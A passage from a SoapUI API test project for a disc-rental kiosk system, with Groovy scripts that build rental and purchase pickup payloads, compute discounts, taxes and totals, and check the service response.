"hnrCs9ffakBeWpRoL8igs3N4pXwFNmEAQzWoOvMZZ7MKd+hm1npsRQBuEATGG2wUVYN8NjLTW2VOYcMytfR+7iWtB4CjnE3xctffX/5HZzGRkBbWPNW4n/MV7FgaMzvQWydaHY6375XzhDtGv7vhvbr7y2ndVZK63eakKwCcxd0VDEEhk9Mg8GOwfLrzDTSmjZm0Tr5BnhTTjTRSLsxtSztCVmazWlW4jSVw/g8mvlrbRVdqcnYMzqL0qXY8TBJPcHyckMNmwoBqnxMTv8+ZdzVi15sxsIX8NxdUbtpwkqa3B2HVXsXEQB2KY8NhKIS8EJ+Vxf5nw6EmWBD1G70qNz30gVIlfSpLi1WOe7txVEpMoI3rymdb0FuM/xU0YDxbNE1EDA1Ku9/iQWVov4QnnqxXLM8Z5BM0tURDj3go3rpEARUsNt/t4AaVcmMMn+nnHcoDX/iR/Q7Jd+OVFDGA9j607MDfyJlzByIxpV0xNE8KmU2ibh0Ja3sbOZIzprjBQqDeX9g/2pof4bZVwsfpnqWL5IrcpZGKvI+s5kYKJHnXayezgRhYr+h2MvGLpli6T/2TifY9ZpNX/EZZBfqPQ5QnVcsvm9TaWoRELDSIR2k5XAYD+5vEU4pAA4WlzdHhR6NSUuVNVtUldyKsnUvmePQD5vM4zzZRv2dN4mMppfU=","ExpirationMonth": "12","ExpirationYear": "20","KeyId": 100002,"CardId": "LRmLgUrE3rZdtiY+h0thaUhD9TZPJK5tMdxGDrZ7d8Y=","LastFour": "7268","CardType": 6,"Track2": "Io1PisHv1i1UM/JxSFY8AyrGWMnI1OD4OB7Aqcb69YKmNohPuJyrOGO2QL739+p6sLm4YlcUhte2ooRtfZ5sCaktjA7VWxvu9CnbjKqJ8cx2KFf8Ur6DxIhmRl1Gs2e38+y9NnlSGamHRWwRg2VzhQ7t1Bnjk632GrG8Z4DiZy1QwjacQ44/9fcI/1wANXjSGake61UISVYLBcCKYXvv13wdjJ6An5x7z/cld9hl0X7v3crHFIrw3WGARskzyqNgb6AWrH7YCsZMhNhSeYNXcdr19DSu6fSGpoeShTw8YKA4z1DmCmiPZNzhWCwOP098GRbya7AVcEcQJ8j5VICKHfckQwrqz33ouZKV1Exfg8wYMMEkQKjbND49Af0iEHGeCRKfuDxY9CAF+Ma58xM/4c6At42qm8zcVdN34k+H1tPkanccT4LGlElrymdMBRJ/YwlHnYQRWeSZnXGHToHqMimhPfw+z6/j1uPO9Q6zhY/Zkg2lCC1yL5KrLKj6dy32G2CJMibZkXtQtMaxXWAGIIv8uoTHy5ttbIWUv0bZ+8wu2PjaptOwlgneq5a8jpjuoCx4bu6lgEExvYgQ9ZR0ps2GcxguqgYRJ925eBO663tYS+p//rwl6nOpOQmN819X1RWITWnhU/7jTc+2e6Tx+mP5fal+V0yEXhu7BU3eNdU="},</con:value></con:property><con:property><con:name>TransactionID</con:name><con:value>1983225</con:value></con:property><con:property><con:name>PromoCode</con:name><con:value>DVDONME</con:value></con:property><con:property><con:name>PromoValue</con:name><con:value>1.50</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value>75527813105188</con:value></con:property><con:property><con:name>EstimatedLoyaltyAmount</con:name><con:value>1.75</con:value></con:property><con:property><con:name>HasLoyaltyDiscount</con:name><con:value>1</con:value></con:property><con:property><con:name>HasPromoDiscount</con:name><con:value>1</con:value></con:property><con:property><con:name>EnableServiceFee</con:name><con:value>false</con:value></con:property><con:property><con:name>HasUpsell</con:name><con:value>false</con:value></con:property><con:property><con:name>ServiceFeePayload</con:name><con:value/></con:property><con:property><con:name>CardType</con:name><con:value>6</con:value></con:property><con:property><con:name>InvoiceID</con:name><con:value>2149058311</con:value></con:property><con:property><con:name>VendedRentalBarcodes</con:name><con:value/></con:property><con:property><con:name>NonVendedRentalBarcodes</con:name><con:value>000150501,000027376</con:value></con:property><con:property><con:name>VendedRentalsCount</con:name><con:value>0</con:value></con:property><con:property><con:name>VendedPurchaseCount</con:name><con:value>0</con:value></con:property><con:property><con:name>RequestBody</con:name><con:value>payload=%7B%22MessageType%22%3A+%22Pickup%22%2C%22MessageId%22%3A+%220d082bc5-9b4a-490f-8453-fc9dcad10178%22%2C%22EngineVersion%22%3A+%221.15.0.6%22%2C%22BundleVersion%22%3A+%222.2.2.82%22%2C%22Email%22%3A+%22rental.automation%40gmail.com%22%2C%22KioskId%22%3A+1505%2C%22ReferenceNumber%22%3A+5648734%2C%22Blocklisted%22%3A+false%2C%22PickupDateTime%22%3A+%222018-12-26T14%3A40%3A26.0000406%22%2C%22Items%22%3A+%7B%22rental%22+%3A+%7B+%22Items%22+%3A+%5B%7B%22Barcode%22+%3A+%22000150501%22%2C%22MultiDisc%22+%3A+false%2C%22VendStatus%22+%3A+%22DiskNotTaken%22%7D%2C%7B%22Barcode%22+%3A+%22000027376%22%2C%22MultiDisc%22+%3A+false%2C%22VendStatus%22+%3A+%22NotVended%22%7D%5D%7D%7D%7D</con:value></con:property><con:property><con:name>PickupGUID</con:name><con:value>0d082bc5-9b4a-490f-8453-fc9dcad10178</con:value></con:property><con:property><con:name>VendedPurchaseBarcodes</con:name><con:value/></con:property><con:property><con:name>NonVendedPurchaseBarcodes</con:name><con:value/></con:property><con:property><con:name>RentalMDVFlag</con:name><con:value>false,false</con:value></con:property><con:property><con:name>RentalMDVDiscNumber</con:name><con:value>null,null</con:value></con:property><con:property><con:name>PurchaseMDVFlag</con:name><con:value/></con:property><con:property><con:name>PurchaseMDVDiscNumber</con:name><con:value/></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>cf2a43da-fb68-4f28-b647-cabab658b5fb</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>c7ac4c10-ab96-4e99-b1ae-b373224e8115</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>2541f1eb-0d1a-4584-8ec1-f3a53a02616e</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>fd683bb0-82e9-4b17-ba81-0d133272fd8e</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>7482ad5c-957f-47b4-b757-a492aefbb406</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="ModResvPickup" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="" id="c45df076-de13-4403-9820-d5ecdb8a85a0"><con:description/><con:settings/><con:testStep type="groovy" name="Encode Message Body (ModResvPickup)" id="9b9b18e6-862d-4988-979e-eab531a62402"><con:settings/><con:config><script><![CDATA[//NOTES: Starting from just for Rental, need to add logic for purchase.
import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;
Round16 = new DecimalFormat("#.################"); //Rounding the amount to 16 decimals.

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Get CreditCard Info
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
def KeyID = encryptCC.getPropertyValue("KeyID");
def CardID = encryptCC.getPropertyValue("CardID");
def EncryptedNumber = encryptCC.getPropertyValue("EncryptedNumber");
def EncryptedTrack2 = encryptCC.getPropertyValue("EncryptedTrack2");
def lastFour = encryptCC.getPropertyValue("CardNumber").reverse().take(4).reverse();
def CardType = encryptCC.getPropertyValue("CardType");
testRunner.testCase.setPropertyValue("CardType",CardType);
//log.info ("KeyID:$KeyID; CardID:$CardID; EncryptedNumber:$EncryptedNumber; EncryptedTrack2:$EncryptedTrack2");

//Get hard coded disc prices and non-return days
def dvdPrice = context.expand( '${#TestSuite#DVDPrice}' );
def blurayPrice = context.expand( '${#TestSuite#BlurayPrice}' );
def gamePrice = context.expand( '${#TestSuite#GamePrice}' );
def dvdNonReturnDays = context.expand( '${#TestSuite#DVDNonReturnDays}' );
def blurayNonReturnDays = context.expand( '${#TestSuite#BlurayNonReturnDays}' );
def gameNonReturnDays = context.expand( '${#TestSuite#GameNonReturnDays}' );
def purchasePrice = context.expand( '${#TestSuite#PurchasePrice}' );
def digitalCodePrice = context.expand( '${#TestSuite#DigitalCodePrice}' );
def KioskId= context.expand( '${#TestCase#KioskID}' )

//Reconcile
vendedRentalBarcodes = [];
vendedPurchaseBarcodes = [];
int VendedRentalsCount = 0;
int VendedPurchaseCount = 0;
nonvendedRentalBarcodes = [];
nonvendedPurchaseBarcodes = [];

rentalPayload = "{\"GroupType\" : 1,  \"Items\" : [";
BigDecimal rentalTotal = 0;
purchasePayload = "{\"GroupType\" :2,  \"Items\" : [";
BigDecimal purchaseTotal = 0;
BigDecimal digitalTotal = 0;
rentalTitleIds = []; //will have both rental and purchase titleIds.
requestPayload = "";

def numAddRentals = context.expand( '${#TestCase#numOfRentals}' );
numAddRentalsList = numAddRentals.split(",");
def numAddPurchases = context.expand( '${#TestCase#numOfPurchases}' );
numAddPurchasesList = numAddPurchases.split(",");
BigDecimal discountvalue = (context.expand( '${#TestCase#PromoValue}' ).toBigDecimal()); //PromoCode Value
def rentalFormatIds = context.expand( '${#TestCase#rentalFormats}' );

//Total rental and purchase count
def purchaseCount = context.expand( '${#TestCase#PurchaseCount}' ).toInteger();
def rentalCount = context.expand( '${#TestCase#RentalCount}' ).toInteger();;
log.info ("purchaseCount:$purchaseCount; rentalCount:$rentalCount")
EstimatedLoyaltyAmount = context.expand( '${#TestCase#EstimatedLoyaltyAmount}' )
if(rentalCount > 0)
{
	BigDecimal EstimatedLoyaltyAmount = EstimatedLoyaltyAmount.toBigDecimal();
}
else
{
	BigDecimal EstimatedLoyaltyAmount = 0;
}

//Discount and CreditCard payload
def discountPayload = context.expand( '${#TestCase#DiscountPayload}' );
def serviceFeePayload = context.expand( '${#TestCase#ServiceFeePayload}' );
def ccPayload = context.expand( '${#TestCase#CCPayload}' );
def CustomerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' );

//Rentala and Purchase disc info from Authorize
def purchaseBarcodes = context.expand( '${#TestCase#PurchaseBarcodes}' );
def purchaseTitleIds = context.expand( '${#TestCase#PurchaseTitleIds}' );
def purchaseProductFamily = context.expand( '${#TestCase#PurchaseProductFamily}' );
def purchaseProductType = context.expand( '${#TestCase#PurchaseProductType}' );
def purchaseDiscPrice = context.expand( '${#TestCase#PurchaseDiscPrice}' );

def rentalBarcodes = context.expand( '${#TestCase#RentalBarcodes}' );
def rentalTitleIds = context.expand( '${#TestCase#RentalTitleIds}' );
def rentalProductFamily = context.expand( '${#TestCase#RentalProductFamily}' );
def rentalProductType = context.expand( '${#TestCase#RentalProductType}' );
def rentalDiscPrice = context.expand( '${#TestCase#RentalDiscPrice}' );
def rentalNonReturnPrice = context.expand( '${#TestCase#RentalNonReturnPrice}' );
def rentalNonReturnDays = context.expand( '${#TestCase#RentalNonReturnDays}' );
def rentalVendStatus = context.expand( '${#TestCase#RentalVendStatus}' ); 
def purchaseVendStatus = context.expand( '${#TestCase#PurchaseVendStatus}' );
def itemSourceType = context.expand( '${#TestCase#ItemSourceType}' );

//MDV
def rentalMDVFlag = context.expand( '${#TestCase#RentalMDVFlag}' )
def rentalMDVDiscNumber = context.expand( '${#TestCase#RentalMDVDiscNumber}' )
def purchaseMDVFlag = context.expand( '${#TestCase#PurchaseMDVFlag}' )
def purchaseMDVDiscNumber = context.expand( '${#TestCase#PurchaseMDVDiscNumber}' )

purchaseBarcodesList = purchaseBarcodes.split(",");
purchaseTitleIdsList = purchaseTitleIds.split(",");
purchaseProductFamilyList = purchaseProductFamily.split(",");
purchaseProductTypeList = purchaseProductType.split(",");
purchaseDiscPriceList = purchaseDiscPrice.split(",");
purchaseVendStatusList = purchaseVendStatus.split(","); //TO-DO
rentalBarcodesList = rentalBarcodes.split(",");
rentalTitleIdsList = rentalTitleIds.split(",");
rentalProductFamilyList = rentalProductFamily.split(",");
rentalProductTypeList = rentalProductType.split(",");
rentalDiscPriceList = rentalDiscPrice.split(",");
rentalNonReturnPriceList = rentalNonReturnPrice.split(",");
rentalNonReturnDaysList = rentalNonReturnDays.split(",");
rentalVendStatusList = rentalVendStatus.split(","); //TO-DO
itemSourceTypeList = itemSourceType.split(","); //TO-DO
//MDV
rentalMDVFlagList = rentalMDVFlag.split(",");
rentalMDVDiscNumberList = rentalMDVDiscNumber.split(",");
purchaseMDVFlagList = purchaseMDVFlag.split(",");
purchaseMDVDiscNumberList = purchaseMDVDiscNumber.split(",");

//Build Rental Payload
if (rentalCount <= 0)
{
	log.info ("No Rentals in the transaction");
	testRunner.testCase.setPropertyValue('VendedRentalsCount', VendedRentalsCount.toString());
}
else
{
	for (r = 0; r < rentalBarcodesList.size(); r++)
	{				
		currentalBarcodeId = rentalBarcodesList[r].toString().trim();
		currentalTitleId = rentalTitleIdsList[r].toString().trim();
		currentalProductFamily = rentalProductFamilyList[r].toString().trim();
		currentalProductType = rentalProductTypeList[r].toString().trim();
		currentalDiscPrice = rentalDiscPriceList[r].toString().trim();
		currentalNonReturnPrice = rentalNonReturnPriceList[r].toString().trim();
		currentalNonReturnDays = rentalNonReturnDaysList[r].toString().trim();
		currentalVendStatus = rentalVendStatusList[r].toString().trim();
		curitemSourceType = itemSourceTypeList[r].toString().trim();
		//MDV
		curRentalMDVFlag = rentalMDVFlagList[r].toString().trim();
		curRentalMDVDiscNumber = rentalMDVDiscNumberList[r].toString().trim();

		rentalPayload += "{"
		rentalPayload += "\"ProductId\" : $currentalTitleId,"
		rentalPayload += "\"Barcode\" : \"$currentalBarcodeId\","
		rentalPayload += "\"VendStatus\" : \"$currentalVendStatus\"," //To-DO
		rentalPayload += "\"ProductFamily\" : \"$currentalProductFamily\","
		rentalPayload += "\"ProductType\" : \"$currentalProductType\","
		rentalPayload += "\"MultiDisc\" : $curRentalMDVFlag,"
		rentalPayload += "\"DiscNumber\" : $curRentalMDVDiscNumber,"
		rentalPayload += "\"Pricing\" : {"
		rentalPayload += "\"InitialNight\" : $currentalDiscPrice,"
		rentalPayload += "\"ExtraNight\" : $currentalDiscPrice,"
		rentalPayload += "\"NonReturn\" : $currentalNonReturnPrice,"
		rentalPayload += "\"Expiration\" : $currentalDiscPrice,"
		rentalPayload += "\"NonReturnDays\" : $currentalNonReturnDays,"
		rentalPayload += "\"PriceSetId\" : 0,"
		rentalPayload += "\"Purchase\" : 0,"
		//Added a part of ProductPricing for BI; harcoded for the time being.
		rentalPayload += "\"ProductPriceId\" : 0,"
		rentalPayload += "\"InitialDays\" : 1,"
		rentalPayload += "\"DefaultInitialNight\" : $currentalDiscPrice,"
		rentalPayload += "\"DefaultExtraNight\" : $currentalDiscPrice"
		rentalPayload += "}," 
		rentalPayload += "\"BlurayUpsell\" : null,"
		rentalPayload += "\"SourceType\" : $curitemSourceType"
		rentalPayload += "}" 

		if (r+1 < rentalBarcodesList.size())
		{
		   rentalPayload += ","
		} 

		//Capture vended rentals count and non-vended dics.
		if (currentalVendStatus.equals("Vended")) 
		{
			//Capture Amount of the Disc
			rentalTotal += (currentalDiscPrice.toBigDecimal());
			//Capture Vended Rental
			vendedRentalBarcodes.add(currentalBarcodeId);
			VendedRentalsCount += 1 ;
			testRunner.testCase.setPropertyValue("BarcodeForTnx", currentalBarcodeId);
		} 
		else 
		{
			//Capture Non-vended Rentals
			nonvendedRentalBarcodes.add(currentalBarcodeId);
			testRunner.testCase.setPropertyValue("NonVendedBarcodeForTnx", currentalBarcodeId);
		}
	}		
	testRunner.testCase.setPropertyValue('VendedRentalBarcodes', vendedRentalBarcodes.join(",").toString());
	testRunner.testCase.setPropertyValue('NonVendedRentalBarcodes', nonvendedRentalBarcodes.join(",").toString());
	testRunner.testCase.setPropertyValue('VendedRentalsCount', VendedRentalsCount.toString());
	
	//Rounding the rental Total
	rentalTotal = Round16.format(rentalTotal).toBigDecimal();
	discountvalue = Round16.format(discountvalue).toBigDecimal();
	log.info ("Rentals Total: $rentalTotal; Promo Amount: $discountvalue");
	BigDecimal discountedSubTotal
	discountedSubTotal = ((rentalTotal).toBigDecimal()) - ((EstimatedLoyaltyAmount).toBigDecimal())
	
	if (rentalTotal <= discountvalue)	{ discountedSubTotal = 0 }
	//else { discountedSubTotal = ((rentalTotal).toBigDecimal()) - ((discountvalue).toBigDecimal()) }
	else { discountedSubTotal = ((discountedSubTotal).toBigDecimal()) - ((discountvalue).toBigDecimal()) }
	if (discountedSubTotal < 0)
	{
		discountedSubTotal = 0
	}
	// Rounding Discounted SubTotal 
	discountedSubTotal = Round16.format(discountedSubTotal).toBigDecimal();
	BigDecimal renttaxRate = ((context.expand( '${#TestCase#RentalTaxRate}').toBigDecimal()) / 100)
	BigDecimal rentalTaxAmt = (Round16.format(discountedSubTotal).toBigDecimal()) * ((renttaxRate).toBigDecimal());
	rentalTaxAmt = Round16.format(rentalTaxAmt).toBigDecimal();
	
	BigDecimal grandTotal = discountedSubTotal + rentalTaxAmt;
	// trying to solve some rounding issues
	grandTotal = Round16.format(grandTotal).toBigDecimal();
	log.info ("Rentals Discounted Total:$discountedSubTotal; Rentals Tax Amount:$rentalTaxAmt; Rentals Grand Total:$grandTotal");
	// add totals to the strings
	rentalPayload += "], \"Totals\" : { \"TaxRate\" : " + context.expand( '${#TestCase#RentalTaxRate}') + ", \"Subtotal\" : " + rentalTotal + ", \"DiscountedSubtotal\" : " + discountedSubTotal + ", \"TaxAmount\" : \"" + rentalTaxAmt + "\", \"GrandTotal\" : " + grandTotal + " } }";
	testRunner.testCase.setPropertyValue("rentalPayload",rentalPayload);
	rentalTotal = grandTotal;//Defining it to calculate Total Amount
}

//Purchase payload
if (purchaseCount <= 0)
{
	log.info ("No Purchases in the transaction");
	testRunner.testCase.setPropertyValue('VendedPurchaseCount', VendedPurchaseCount.toString());
}
else
{
	for (p = 0; p < purchaseBarcodesList.size(); p++)
	{				
		curpurchaseBarcode = purchaseBarcodesList[p].toString().trim();
		curpurchaseTitleIds = purchaseTitleIdsList[p].toString().trim();
		curpurchaseProductFamily = purchaseProductFamilyList[p].toString().trim();
		curpurchaseProductType = purchaseProductTypeList[p].toString().trim();
		curpurchaseDiscPrice = purchaseDiscPriceList[p].toString().trim();
		curpurchaseVendStatus = purchaseVendStatusList[p].toString().trim();
		//MDV
		curPurchaseMDVFlag = purchaseMDVFlagList[r].toString().trim();
		curPurchaseMDVDiscNumber = purchaseMDVDiscNumberList[r].toString().trim();
		
		purchasePayload += "{"
		purchasePayload += "\"ProductId\" : $curpurchaseTitleIds,"
		purchasePayload += "\"Barcode\" : \"$curpurchaseBarcode\","
		purchasePayload += "\"VendStatus\" : \"$curpurchaseVendStatus\"," //To-DO
		purchasePayload += "\"ProductFamily\" : \"$curpurchaseProductFamily\","
		purchasePayload += "\"ProductType\" : \"$curpurchaseProductType\","
		purchasePayload += "\"MultiDisc\" : $curPurchaseMDVFlag,"
		purchasePayload += "\"DiscNumber\" : $curPurchaseMDVDiscNumber,"
		purchasePayload += "\"Pricing\" : {"
		purchasePayload += "\"InitialNight\" : 0,"
		purchasePayload += "\"ExtraNight\" : 0,"
		purchasePayload += "\"NonReturn\" : 0,"
		purchasePayload += "\"Purchase\" : $curpurchaseDiscPrice,"
		purchasePayload += "\"Expiration\" : 0,"
		purchasePayload += "\"NonReturnDays\" : 0,"
		purchasePayload += "\"PriceSetId\" : 0,"
		//Added a part of ProductPricing for BI; harcoded for the time being.
		purchasePayload += "\"ProductPriceId\" : 0,"
		purchasePayload += "\"InitialDays\" : null,"
		purchasePayload += "\"DefaultInitialNight\" : null,"
		purchasePayload += "\"DefaultExtraNight\" : null"
		purchasePayload += "}," 
		purchasePayload += "\"BlurayUpsell\" : null,"
		purchasePayload += "\"SourceType\" : 0"
		purchasePayload += "}"

		if (p+1 < purchaseBarcodesList.size())
		{
		   purchasePayload += ","
		}
		//Capture vended rentals count and non-vended dics.
		if (curpurchaseVendStatus.equals("Vended")) 
		{
			if (curpurchaseProductType == "DigitalCode")
			{
				//Capture Amount of the Disc (DigitalCode)
				digitalTotal += (curpurchaseDiscPrice.toBigDecimal());
				//Capture Vended Rental
				vendedPurchaseBarcodes.add(curpurchaseBarcode);
				VendedPurchaseCount += 1;
			}
			else
			{
				//Capture Amount of the Disc (Regular Purchase)
				purchaseTotal += (curpurchaseDiscPrice.toBigDecimal());
				//Capture Vended Rental
				vendedPurchaseBarcodes.add(curpurchaseBarcode);
				VendedPurchaseCount += 1;
			}
		} 
		else 
		{
			//Capture Non-vended Rentals
			nonvendedPurchaseBarcodes.add(curpurchaseBarcode);
		}
	}
	
	testRunner.testCase.setPropertyValue('VendedPurchaseBarcodes', vendedPurchaseBarcodes.join(",").toString());
	testRunner.testCase.setPropertyValue('NonVendedPurchaseBarcodes', nonvendedPurchaseBarcodes.join(",").toString());
	testRunner.testCase.setPropertyValue('VendedPurchaseCount', VendedPurchaseCount.toString());
	
	//Purchase Calculation	
	BigDecimal totalPurchaseTotal = (purchaseTotal.toBigDecimal() + digitalTotal.toBigDecimal())
	//log.info ("totalPurchaseTotal: $totalPurchaseTotal");
	
	def purchasetaxRate = context.expand( '${#TestCase#PurchaseTaxRate}');
	def digitalpurchasetaxRate = context.expand( '${#TestCase#DigitalPurchaseTaxRate}');
	if (digitalpurchasetaxRate == null || digitalpurchasetaxRate == "null" || digitalpurchasetaxRate == "") //If digitalpurchasetaxrate is null than use Purchase tax rate.
	{
		BigDecimal digitaltaxRate = ((purchasetaxRate.toBigDecimal()) / 100);
		BigDecimal digitalpurchaseTaxAmt = (Round16.format(digitalTotal).toBigDecimal()) * ((digitaltaxRate).toBigDecimal());
		digitalpurchaseTaxAmt = Round16.format(digitalpurchaseTaxAmt).toBigDecimal();
		testRunner.testCase.setPropertyValue("digitalpurchaseTaxAmt", digitalpurchaseTaxAmt.toString());
	}
	else //if digitalpurchasetaxrate is not null than use that ever is provided.
	{
		BigDecimal digitaltaxRate = ((digitalpurchasetaxRate.toBigDecimal()) / 100);
		BigDecimal digitalpurchaseTaxAmt = (Round16.format(digitalTotal).toBigDecimal()) * ((digitaltaxRate).toBigDecimal());
		digitalpurchaseTaxAmt = Round16.format(digitalpurchaseTaxAmt).toBigDecimal();
		testRunner.testCase.setPropertyValue("digitalpurchaseTaxAmt", digitalpurchaseTaxAmt.toString());
	}
	def totaldigitalpurchasetaxAmount = context.expand( '${#TestCase#digitalpurchaseTaxAmt}');
		
	BigDecimal purchaseTaxAmt = (Round16.format(purchaseTotal).toBigDecimal()) * ((purchasetaxRate).toBigDecimal()/100);
	purchaseTaxAmt = Round16.format(purchaseTaxAmt).toBigDecimal();
	
	log.info ("Digital Purchase Tax Amount: $totaldigitalpurchasetaxAmount; Purchase Tax Amount: $purchaseTaxAmt");
	def totalTaxAmount = (totaldigitalpurchasetaxAmount.toBigDecimal() + purchaseTaxAmt.toBigDecimal());
	BigDecimal purchaseGrandTotal = (totalPurchaseTotal + totalTaxAmount).toBigDecimal();
	log.info("Purchase Grand Total: $purchaseGrandTotal; Total Tax Amount: $totalTaxAmount");
	
	def HasPhysicalPurchase = context.expand( '${#TestCase#HasPhysicalPurchase}');
	// add totals to the strings
	purchasePayload += "], \"Totals\" : { ";
	if (HasPhysicalPurchase == 'true')
	{
		purchasePayload += "\"TaxRate\" : " + context.expand('${#TestCase#PurchaseTaxRate}') + ", ";
	}
	else
	{
		purchasePayload += "\"TaxRate\" : " + context.expand('${#TestCase#DigitalPurchaseTaxRate}') + ", ";
	}
	purchasePayload += "\"Subtotal\" : " + totalPurchaseTotal + ",";
	purchasePayload += "\"DiscountedSubtotal\" : " + totalPurchaseTotal + ",";
	purchasePayload += "\"TaxAmount\" : \"" + totalTaxAmount + "\",";
	purchasePayload += "\"GrandTotal\" : " + purchaseGrandTotal + " } }";
	
	// add totals to the strings
	//purchasePayload += "], \"Totals\" : { \"TaxRate\" : " + context.expand('${#TestCase#purchasetaxrate}') + ", \"Subtotal\" : " + totalPurchaseTotal + ", \"DiscountedSubtotal\" : " + totalPurchaseTotal + ", \"TaxAmount\" : \"" + totalTaxAmount + "\", \"GrandTotal\" : " + purchaseGrandTotal + " } }";
	testRunner.testCase.setPropertyValue("purchasePayload",purchasePayload);
	purchaseTotal = purchaseGrandTotal;//Defining it to calculate Total Amount
}
//log.info ("purchasePayload: $purchasePayload; rentalPayload: $rentalPayload");
TransactionTotal = (rentalTotal + purchaseTotal).setScale(2, BigDecimal.ROUND_HALF_UP);
testRunner.testCase.setPropertyValue("TransactionTotal",TransactionTotal.toString());

def MessageId = UUID.randomUUID().toString();
def PromoCode = context.expand( '${#TestCase#PromoCode}');
def UseCredits = context.expand( '${#TestCase#UseCredits}');
calendar = Calendar.getInstance();
def theDate = (621355968000000000 +calendar.getTimeInMillis()*10000).toString();
def dateString = (new Date().format("yyyy-MM-dd'T'HH:mm:ss.SSSSSSS"));
def Email = context.expand( '${#TestCase#Email}');
def IsOffline = context.expand( '${#TestCase#IsOffline}');
def TransactionID = context.expand( '${#TestCase#TransactionID}');
def ReferenceNumber = context.expand( '${#TestCase#ReferenceNumber}');
def ModifiedCart = context.expand( '${#TestCase#ModifiedCart}');

//Build Reconcile Request
requestPayload += "{";
requestPayload += "\"MessageType\": \"ModResvPickup\",";
requestPayload += "\"MessageId\": \"$MessageId\",";
requestPayload += "\"EngineVersion\": \"1.31.0.17\",";
requestPayload += "\"BundleVersion\": \"2.31.0.6\",";
requestPayload += "\"Email\": \"$Email\",";
requestPayload += "\"KioskId\": $KioskId,";
requestPayload += "\"ReferenceNumber\": $ReferenceNumber,";
requestPayload += "\"Items\": { },";
requestPayload += "\"PickupDate\": {";
requestPayload += "\"theDate\": $theDate,";
requestPayload += "\"dateTimeKind\": \"Local\",";
requestPayload += "\"dateString\": \"$dateString\"";
requestPayload += "},";
requestPayload += "\"ModifiedCart\": $ModifiedCart,";
requestPayload += "\"ShoppingCart\": { ";
requestPayload += "\"Groups\": [  ";
if (rentalCount > 0 && purchaseCount == 0) {
	requestPayload += "$rentalPayload";
} else if (rentalCount == 0 && purchaseCount > 0) {
	requestPayload += "$purchasePayload";
} else if (rentalCount > 0 && purchaseCount > 0) {
	requestPayload += "$rentalPayload,$purchasePayload";
} else {
	log.info("No rental or purchase information generated!");
}
requestPayload += "],";
requestPayload += "\"Discounts\": [$discountPayload]";
requestPayload += "$serviceFeePayload";
requestPayload += "}} ";

// log to soapui log
log.info("ModResvPickup Request: $requestPayload");

// url encode json string
result = "payload=" + URLEncoder.encode(requestPayload)
testRunner.testCase.setPropertyValue("RequestBody",result)
testRunner.testCase.setPropertyValue("ReconcileGUID",MessageId.toString()); //For MessageControl Validations]]></script></con:config></con:testStep><con:testStep type="httprequest" name="ModResvPickup (Request)" id="aa167b55-4908-4f70-9504-702d93bebb87"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" name="ModResvPickup (Request)" postQueryString="false" mediaType="application/x-www-form-urlencoded" id="b2fa5210-dde2-4787-8c9d-57bcd781cdfc" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:endpoint>${#Project#KSEndpoint}</con:endpoint><con:request>${#TestCase#RequestBody}</con:request><con:assertion type="GroovyScriptAssertion" name="Check for Success and HasErrors" id="70bc7102-0d46-4704-81fc-09b7237cee25"><con:configuration><scriptText>def response = URLDecoder.decode(messageExchange.getResponseContent())

log.info ("ModResvPickup Response: $response")
	assert response.contains("\"Success\":true,")
	assert response.contains("\"HasErrors\":false,")

</scriptText></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>Basic</con:selectedAuthProfile><con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes><con:authType>Global HTTP Settings</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>Basic</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>Basic</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:testStep type="groovy" name="Get ReferenceNumber" id="b16110b0-8503-4197-8ba4-1e274b50a080" disabled="true"><con:settings/><con:config><script>import groovy.json.JsonSlurper
def IsOffline = context.expand( '${#TestCase#IsOffline}');
def BarcodeForTnx = context.expand( '${#TestCase#BarcodeForTnx}');
Barcode = "";
if (BarcodeForTnx == "")
{
	Barcode = context.expand( '${#TestCase#NonVendedBarcodeForTnx}');
}
else
{
	Barcode = context.expand( '${#TestCase#BarcodeForTnx}');
}

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);
def getTnxQuery = "";

if (IsOffline == 'true')
{
	//Build SQL Query
	getTnxQuery += "Select TOP 1 "
	getTnxQuery += "\n"
	getTnxQuery += "t.Transaction_ID,t.InvoiceID "
	getTnxQuery += "\n"
	getTnxQuery += "From [Transaction] t"
	getTnxQuery += "\n"
	getTnxQuery += "Inner Join Disc_Transaction dt  on t.Transaction_ID = dt.Transaction_ID "
	getTnxQuery += "\n"
